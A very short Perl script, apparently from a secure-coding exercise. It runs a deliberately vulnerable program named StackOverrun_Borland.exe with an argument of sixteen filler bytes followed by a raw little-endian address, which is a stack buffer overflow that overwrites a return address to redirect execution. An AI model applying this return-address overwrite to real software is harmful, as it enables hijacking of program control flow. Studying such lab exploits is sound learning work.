use warnings FATAL => 'all';
use strict;

my $ arg =  "zzzzzzzzzzzzzzzz"."\x7F\x11\x40\x00"; 
my $cmd = "./StackOverrun_Borland.exe ".$arg;
srand(0);

system($cmd);
